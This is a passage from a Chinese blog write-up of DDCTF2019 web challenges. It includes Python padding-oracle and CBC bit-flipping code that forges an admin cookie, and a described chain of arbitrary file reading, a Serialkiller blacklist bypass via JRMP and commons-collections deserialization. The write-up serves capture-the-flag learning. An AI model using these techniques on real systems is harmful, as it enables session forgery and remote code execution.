&quot;\x2BC\x0D\x2BP\x5BR\x5CU\x16K\x04\x40\x0F\x07\x22&quot;</span></span><br><span class="line"><span class="comment"># c_final11 = &quot;P\xBE\x15\x9D\x03y\xA2bv.u\x10\xD3\xE7\x03\xF8&quot;</span></span><br><span class="line">c_final11 = <span class="string">&quot;\x00\xDFq\xD2q\x18\xC1\x0E\x13\x14\x1Cf\xFC\x84a\x9B&quot;</span></span><br><span class="line"></span><br><span class="line">IV = <span class="string">&quot;&quot;</span></span><br><span class="line">i_need = <span class="string">&#x27;&#123;&quot;id&quot;:100,&quot;roleA&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    IV += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c_final11[x]) ^ <span class="built_in">ord</span>(i_need[x]))</span><br><span class="line">c = <span class="string">&quot;&quot;</span></span><br><span class="line">i_need = <span class="string">&#x27;dmin&quot;:true&#125;&#x27;</span> + <span class="number">5</span> * <span class="string">&quot;\x05&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    c += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c_final2[x]) ^ <span class="built_in">ord</span>(i_need[x]))</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(IV + c + data[<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line">exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding Oracle</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        IV = <span class="string">&quot;\x00&quot;</span> * (<span class="number">16</span> - x) + <span class="built_in">chr</span>(y) + <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ x) <span class="keyword">for</span> i <span class="keyword">in</span> c_final11)</span><br><span class="line">        payload = base64.b64encode(IV + c)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;token=&quot;</span> + payload,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = myd.get(url, headers=headers).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;decrypt err&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            c_final11 = <span class="built_in">chr</span>(y ^ x) + c_final11</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[+]Get: &quot;</span> + urllib.quote(c_final11)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> y == <span class="number">255</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[!]Error!&quot;</span></span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> urllib.quote(c_final11)</span><br><span class="line"><span class="comment"># for x in xrange(16):</span></span><br><span class="line"><span class="comment">#     m += chr(ord(c_final11[x]) ^ ord(iv[x]))</span></span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line"><span class="comment"># print urllib.quote(m)</span></span><br><span class="line"></span><br><span class="line">exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>修改 cookie ，成为 admin 后看到一个下载链接，这里有一个任意文件下载漏洞。</p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>下载到一个 1.txt ，提示说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~ </span><br></pre></td></tr></table></figure>
+
+<p>坑，利用文件读取漏洞，跑字典可以在 &#x2F;proc&#x2F;self&#x2F;fd&#x2F;15 处下载到一个 zip ，里面就是题目的源码。</p>
+<h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>参考 writeup ：<a href="https://xz.aliyun.com/t/4862#toc-7">https://xz.aliyun.com/t/4862#toc-7</a></p>
+<p>我虽然了解一点 Java 反序列化漏洞，但是从来没有用过 ysoserial 这个工具，趁这个机会也正好学习一下。</p>
+<p>审计代码，可以看到它提供了一个无法回显的反序列化接口，并且使用 Serialkiller 对我们反序列化的类进行了黑名单过滤。所以我们的第一个目标就是绕过这份黑名单。</p>
+<p>根据提示的 JRMP ，我们注意到黑名单中的 JRMP 类只有三个：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.registry\.Registry$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.ObjID$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.rmi\.server\.RemoteObjectInvocationHandler$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a href="https://xz.aliyun.com/t/2479">https://xz.aliyun.com/t/2479</a> ，找个方式，修改 ysoserial 中的 JRMPClient ，重新编译再输出 payload 即可。</p>
+<p>现在我们就可以通过 JRMP 的方式来反序列化任意类了，关注项目依赖中的 commons-collections:3.1 ，我们通过这个低版本的组件实现代码执行，参考文章：<a href="https://blog.csdn.net/fnmsd/article/details/79534877">https://blog.csdn.net/fnmsd/article/details/79534877</a></p>
+<p>效果：</p>
+<p><img src="/css/images/DDCTF2019/2019041999.png" srcset="/img/loading.gif"></p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p><a href="https://paper.seebug.org/584/">https://paper.seebug.org/584/</a></p>
+<p><a href="https://xz.aliyun.com/t/2479">https://xz.aliyun.com/t/2479</a></p>
+<p><a href="https://xz.aliyun.com/t/2041">https://xz.aliyun.com/t/2041</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/04/23/DDCTF2019-Pwn-strike/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>DDCTF2019 [Pwn]strike</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/04/18/Spring-Cloud-Config-Server-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%C2%96%C2%96CVE-2019-3799%E5%A4%8D%E7%8E%B0/">
+                        <span>Spring Cloud Config Server 路径穿越与任意文件读取漏洞 CVE-2019-3799复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "DDCTF2019-Web题解&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
